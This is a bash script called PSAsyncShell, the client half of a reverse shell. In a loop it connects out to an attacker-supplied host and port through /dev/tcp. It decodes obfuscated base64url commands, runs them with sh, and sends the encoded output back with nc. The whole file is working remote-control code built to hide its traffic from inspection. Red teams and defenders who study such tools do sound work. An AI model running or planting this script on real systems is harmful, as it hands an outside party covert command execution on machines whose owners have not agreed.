#!/bin/bash
#================================#
#     PSAsyncShell by @JoelGMSec #
#        https://darkbyte.net    #
#================================#

# Variables
host=$2
port=$3
debug=$4

# Debug function
debug_log() {
    if [[ ! -z "$debug" ]]; then
        echo "[DEBUG] $1" >&2
    fi
}

# Main
while true; do
    base64url=$(echo -n $(pwd) | base64 | tr '/+' '_-' | tr -d '=' | rev | cat < /dev/tcp/$host/$port 2>/dev/null)
    base64url=$(echo -n $base64url | tr -d '.{}><*$%:;()@~=[]!?^&|#/' | rev)
    base64url=$(echo -n "$base64url"==== | fold -w 4 | sed '$ d' | tr -d '\n' | tr '_-' '/+' | base64 -d)
    debug_log "Received command (raw): '$base64url'"
    
    sleep 0.5

    if [[ $base64url == "exit" ]]; then
        debug_log "Exit command detected, terminating..."
        exit 0
    fi

    if [[ ! $base64url == "[+]*" ]]; then
        base64url=$(echo -n "$base64url" | sed "s/Set-Location/cd/")
        debug_log "Processed command: '$base64url'"
        output=$(echo -n "$base64url" | sh 2>&1)
        exit_code=$?
        
        debug_log "Command output: '$output'"
        debug_log "Exit code: $exit_code"
        encoded_output=$(echo -n "$output" | base64 | tr '/+' '_-' | tr -d '=' | tr -d '[:space:]' | rev)
        debug_log "Encoded output: '$encoded_output'"
        base64url=$(echo "$encoded_output" | nc $host $port 2>/dev/null)
    fi
done
